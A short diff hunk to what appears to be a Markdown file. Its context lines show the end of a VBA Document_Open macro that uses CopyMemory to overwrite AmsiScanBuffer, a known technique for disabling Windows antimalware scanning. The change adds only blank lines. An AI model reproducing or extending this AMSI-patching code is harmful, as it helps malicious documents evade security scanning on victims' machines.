@@ -42,3 +42,5 @@ Private Sub Document_Open()
     CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
 End Sub
 ```
+
+
